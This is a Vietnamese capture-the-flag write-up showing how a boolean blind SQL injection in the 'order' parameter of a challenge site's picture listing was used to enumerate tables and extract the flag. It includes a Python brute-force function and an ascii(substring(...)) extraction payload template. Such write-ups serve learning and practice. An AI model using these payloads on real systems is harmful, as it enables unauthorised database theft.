Chúng ta truy cập vào trang http://photoshop0.scoreboard.ns01.info/ và có giao diện:

![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/Photoshop0/home.PNG)

Lướt qua 1 số link và test thử, ta thấy ở link All pictures, trường order bị lỗi sqli. Ví dụ như ta cho order=1 và order=2 thay vì order=id, thứ tự của các bức ảnh được hiển thị sẽ bị thay đổi. 

Thú vị hơn: nếu chúng ta cho order=rand(true) và order=rand(false) thứ tự sẽ thay đổi, với rand(false) cho kết quả thứ tự giống với order=id (cthulhu.png đứng sau hacker.png trong source code), dẫn tới ý tưởng sử dụng được boolean, và từ đó dùng blind sqli để bruteforce giá trị mong muốn.

Ví dụ chúng ta có thể viết 1 hàm như sau để scan giá trị độ dài của bảng information_schema.tables:

```python

def scan_length(url):
        query = '?order=rand((select count(*) from information_schema.tables)='
        for i in range(1,1000):
                newquery = query + str(i) + ')'
                response = requests.get(url+newquery)
                try:
                        if response.text.index('cthulhu.png') < response.text.index('hacker.png'):
                                print i
                                break
                except:
                                break

```                          

Và để tìm giá trị 1 ô nào đó, chúng ta dùng:
?order=rand((select ascii(substring(''column'',x,1)) from ''table'' limit 1)=y
trong đó:
	''column'' là tên cột
	x là chữ cái thứ bao nhiêu của cell đó
	''table'' là tên bảng
	y là giá trị bruteforce ascii của chữ cái đó

Chỉnh sửa code để scan các giá trị quan trọng, chúng ta có 1 số thông số:

64 tables
615 columns

TABLE:
users
pictures
categories
flag

COLUMN:
FLAG

Vậy là chúng ta có các giá trị bảng và cột cần tấn công ở đây là flag và FLAG. Sau khi scan chúng ta có flag:

![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/Photoshop0/flag.PNG)

flag: Flag{0rder_Sql1}